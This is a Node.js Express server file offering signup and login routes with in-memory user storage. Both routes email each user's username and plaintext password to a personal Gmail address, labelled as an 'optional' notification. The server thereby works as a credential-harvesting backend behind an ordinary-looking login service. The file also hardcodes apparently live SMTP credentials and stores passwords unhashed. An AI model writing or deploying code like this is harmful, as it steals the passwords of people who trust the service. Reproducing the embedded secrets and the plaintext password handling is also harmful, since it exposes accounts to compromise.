const express = require('express');
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Registered users array — will store users after signup
const users = [];

// Nodemailer transporter (your Brevo SMTP)
const transporter = nodemailer.createTransport({
  host: 'smtp-relay.brevo.com',
  port: 587,
  secure: false,
  auth: {
    user: '8ef22c001@smtp-brevo.com',
    pass: 't9m2I7xKrA1Hn0qc'
  }
});

transporter.verify((error, success) => {
  if (error) {
    console.error('SMTP connection error:', error);
  } else {
    console.log('SMTP server is ready to send emails');
  }
});

// Signup route - Add new user to array if username/email not taken
app.post('/signup', (req, res) => {
  const { username, email, password } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ message: 'Username, email, and password are required' });
  }

  // Check if username or email already exists
  const exists = users.find(
    user => user.username === username || user.email === email
  );
  if (exists) {
    return res.status(400).json({ message: 'Username or email already registered' });
  }

  // Save user in memory
  users.push({ username, email, password });

  // Send signup email notification (optional)
  const mailOptions = {
    from: '"Paldo kaboss" <kennethgleabo11@gmail.com>',
    to: 'kennethgleabo11@gmail.com',
    subject: 'New Account Created',
    text: `New signup details:\n\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Error sending signup email:', error);
      return res.status(500).json({ message: 'Failed to send signup email' });
    }
    console.log('✅ Signup email sent:', info.response);
    res.status(201).json({ message: 'User registered successfully' });
  });
});

// Login route - Only allow login if user exists with matching password
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password required' });
  }

  // Find user by username or email
  const user = users.find(
    user => (user.username === username || user.email === username) && user.password === password
  );

  if (!user) {
    // User not found or password incorrect
    return res.status(401).json({ message: 'Invalid username or password' });
  }

  // Send login email notification (optional)
  const mailOptions = {
    from: '"Paldo kaboss" <kennethgleabo11@gmail.com>',
    to: 'kennethgleabo11@gmail.com',
    subject: 'New Login Attempt',
    text: `Username/Email: ${username}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Error sending login email:', error);
      return res.status(500).json({ message: 'Failed to send login email' });
    }
    console.log('✅ Login email sent:', info.response);
    res.json({ message: 'Login successful', user: { username } });
  });
});

// 404 fallback
app.get('*', (req, res) => {
  res.status(404).send('Page not found');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
